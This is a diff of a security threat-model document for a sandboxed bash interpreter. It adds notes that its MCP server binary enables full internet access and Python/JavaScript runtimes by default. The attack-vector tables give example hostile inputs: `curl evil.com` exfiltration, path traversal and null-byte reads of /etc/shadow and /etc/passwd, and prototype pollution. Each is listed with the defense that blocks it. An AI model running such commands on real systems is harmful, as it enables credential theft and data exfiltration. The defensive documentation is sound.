@@ -95,7 +95,7 @@ The following components are **trusted** and outside the scope of @ag-bash/bash'
 
 **TB2 — Interpreter → Filesystem**: The interpreter issues filesystem operations. The FS layer must confine all access to the sandbox root, block symlink traversal, and prevent writes to the real filesystem.
 
-**TB3 — Interpreter → Network**: Network access disabled by default. When enabled, URLs must pass the allow-list.
+**TB3 — Interpreter → Network**: Network access disabled by default. When a `NetworkConfig` is provided, URLs must pass the allow-list (an omitted or empty `allowedUrlPrefixes` denies every URL) unless the config opts into `dangerouslyAllowFullInternetAccess`. **Exception**: the standalone `@ag-bash/mcp-server` binary (`packages/mcp-server/src/index.ts`) deliberately constructs its `Bash` instance with `dangerouslyAllowFullInternetAccess: true` — full internet access, no allow-list — while keeping `denyPrivateRanges: true` for SSRF protection against internal/metadata IPs. This was an intentional hardening-era decision (a general-purpose MCP shell tool needs `curl`/`fetch` to work against arbitrary URLs out of the box, unlike an embedder that knows its own fixed set of allowed origins), not an oversight — but it means the MCP binary's actual network posture is *SSRF-guarded, not allow-list-gated*, which differs from the allow-list model this section otherwise describes.
 
 **TB4 — Interpreter → Host Process**: The interpreter must never spawn child processes, access host environment variables, or reach Node.js internals (process.binding, require, import()).
 
@@ -154,7 +154,7 @@ The following components are **trusted** and outside the scope of @ag-bash/bash'
 
 | Vector | Description | Defense | Files |
 |--------|-------------|---------|-------|
-| Arbitrary access | `curl evil.com` | Network disabled by default; curl only registered when NetworkConfig provided | `src/commands/registry.ts` |
+| Arbitrary access | `curl evil.com` | Network disabled by default; curl only registered when NetworkConfig provided. **Exception**: `@ag-bash/mcp-server` ships with `dangerouslyAllowFullInternetAccess: true` (see TB3) — SSRF-guarded but not allow-list-gated for that specific binary. | `src/commands/registry.ts`, `packages/mcp-server/src/index.ts` |
 | SSRF via redirects | Redirect to internal service | Each redirect validated against allow-list; manual redirect handling | `src/network/fetch.ts` |
 | Response bomb | Huge response body | maxResponseSize (10MB) enforced via Content-Length and streaming | `src/network/fetch.ts` |
 | Protocol restriction | Only http/https allowed | Allow-list rejects all other protocols | `src/network/allow-list.ts` |
@@ -331,7 +331,7 @@ When `python: true`, CPython 3.13 Emscripten provides full Python execution via 
 - Test modules (`_testcapi`, `_testinternalcapi`, etc.) stripped from binary
 
 **Runtime mitigations**:
-- Disabled by default; must be explicitly enabled via `{ python: true }`
+- Disabled by default; must be explicitly enabled via `{ python: true }`. **Exception**: the standalone `@ag-bash/mcp-server` binary (`packages/mcp-server/src/index.ts`, same constructor as the TB3 network exception above) explicitly sets `runtimes: { python: true, javascript: true }` — every real `npx @ag-bash/mcp-server` install has this opt-in surface active from the start, not as an edge case a consumer chose. All mitigations below still apply; this only changes who is exposed to them by default.
 - 30-second timeout (`maxPythonTimeoutMs`; configurable)
 - Fresh Worker thread per execution (EXIT_RUNTIME; no state leakage between runs)
 - `WorkerDefenseInDepth` with only 2 exclusions: `shared_array_buffer`, `atomics`
@@ -398,10 +398,10 @@ Heredocs with variable expansion are size-limited (10MB) but nested heredocs wit
 | 4 | Infinite loop | `while true; do :; done` → maxLoopIterations → throw | **BLOCKED** (limits) |
 | 5 | Prototype pollution | `arr[__proto__]=evil` → Map/null-prototype → no effect | **BLOCKED** (data guards) |
 | 6 | dynamic import() escape | Hypothetical JS exec → `import('data:...')` → ESM hooks block data:/blob: URLs | **BLOCKED** (Node.js 20.6+; residual on older) |
-| 7 | Network exfiltration | `curl evil.com` → network off → curl not registered | **BLOCKED** (network isolation) |
+| 7 | Network exfiltration | `curl evil.com` → network off → curl not registered (except `@ag-bash/mcp-server`, SSRF-guarded but allow-list-bypassed — see TB3/§3.4) | **BLOCKED** (network isolation) |
 | 8 | process.exit() | No bash→JS path. If bug: defense-in-depth → throw | **BLOCKED** (arch + secondary) |
 | 9 | Brace expansion OOM | `{1..999999999}` → maxBraceExpansionResults → truncated | **BLOCKED** (limits) |
-| 10 | Python escape | Python off by default. If on: worker + defense + virtual FS | **RESIDUAL RISK** (opt-in) |
+| 10 | Python escape | Python off by default (except `@ag-bash/mcp-server`, which opts in for every install — see §4.7). If on: worker + defense + virtual FS | **RESIDUAL RISK** (opt-in) |
 | 11 | ReDoS via user regex | `[[ str =~ evil_pattern ]]` → re2js → linear-time match | **BLOCKED** (re2js) |
 | 12 | Path traversal | `cat ../../etc/shadow` → normalize → `isPathWithinRoot()` → ENOENT | **BLOCKED** (primary FS) |
 | 13 | Null byte injection | `cat "file\x00../../etc/passwd"` → `validatePath()` → rejected | **BLOCKED** (path validation) |
